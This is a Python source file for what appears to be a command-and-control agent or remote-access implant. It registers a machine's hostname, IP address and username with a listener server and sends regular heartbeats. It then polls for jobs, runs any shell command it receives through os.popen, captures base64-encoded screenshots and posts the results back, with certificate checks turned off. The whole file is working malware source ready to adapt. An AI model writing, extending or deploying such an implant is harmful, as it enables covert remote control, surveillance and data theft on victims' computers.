import os
import socket
import requests
import time
import threading
import warnings
from urllib3.exceptions import InsecureRequestWarning
import base64  # for encoding the screenshot
import pyautogui  # for capturing the screenshot
import io

# Suppress only the InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)

LISTENER_IP = "127.0.0.1"  # Adjust as necessary
LISTENER_PORT = 10001  # Adjust to match your listener's port
SECRET_KEY = "PASSWORD"  # Adjust to match your listener's secret key

AGENT_ID = None  # This will be set upon registration

def gather_info():
    """Gather basic info from the agent machine."""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    username = os.getlogin()
    return {
        "hostname": hostname,
        "ip_address": ip_address,
        "username": username
    }

def register_with_listener():
    """Send agent data to the listener for registration."""
    global AGENT_ID
    agent_data = gather_info()
    headers = {
        'X-Secret-Key': SECRET_KEY,
        'Content-Type': 'application/json'
    }
    response = requests.post(f"https://{LISTENER_IP}:{LISTENER_PORT}/tag", headers=headers, json=agent_data, verify=False)
    
    if response.status_code == 200:
        AGENT_ID = response.json()['agent_id']
        print(f"Successfully registered with ID: {AGENT_ID}")
    else:
        print("Registration failed:", response.text)

def heartbeat_with_listener():
    """Regularly send a heartbeat to the listener."""
    while True:
        # Define sleep_time at the beginning of the loop
        sleep_time = 10

        headers = {
            'X-Secret-Key': SECRET_KEY,
            'X-Agent-ID': AGENT_ID,
            'X-Sleep-Duration': str(sleep_time)  # Convert to string since headers expect string values
        }

        try:
            response = requests.get(f"https://{LISTENER_IP}:{LISTENER_PORT}/beat", headers=headers, verify=False)
            if response.status_code == 200:
                print("[+] Heartbeat acknowledged by server")
            else:
                print("[-] Heartbeat failed:", response.text)
        except Exception as e:
            print("[-] Heartbeat error:", str(e))
        
        time.sleep(sleep_time)

def capture_screenshot():
    """Capture a screenshot and return its base64 encoded value."""
    screenshot = pyautogui.screenshot()
    
    # Create a bytes buffer and save the screenshot to it
    buffered = io.BytesIO()
    screenshot.save(buffered, format="PNG")
    
    # Encode the bytes to base64 and return
    return base64.b64encode(buffered.getvalue()).decode()

def command_loop():
    headers = {
        'X-Secret-Key': SECRET_KEY
    }
    while True:
        try:
            response = requests.get(f"https://{LISTENER_IP}:{LISTENER_PORT}/jobs/{AGENT_ID}", headers=headers, verify=False)
            data = response.json()

            if "message" in data and data["message"] == "No unprocessed job available for this agent":
                print("No jobs available at the moment.")
            else:
                job = data
                command = job['command']

                if command == "!screenshot":
                    screenshot_data = capture_screenshot()
                    job_result_data = {
                        'job_id': job['_id'],
                        'output': "Screenshot captured successfully!",
                        'screenshot': screenshot_data
                    }
                else:
                    result = os.popen(command).read()
                    print(result)  # Display the result on the agent side
                    job_result_data = {
                        'job_id': job['_id'],
                        'output': result
                    }

                # Send result back to the server
                result_response = requests.post(f"https://{LISTENER_IP}:{LISTENER_PORT}/job_result", headers=headers, json=job_result_data, verify=False)
                print(result_response.text)  # Display the response from the server regarding the result
        except Exception as e:
            print("[-] Command loop error:", str(e))
        time.sleep(5)

if __name__ == "__main__":
    register_with_listener()

    # Start the heartbeat and command loops in separate threads
    threading.Thread(target=heartbeat_with_listener).start()
    threading.Thread(target=command_loop).start()
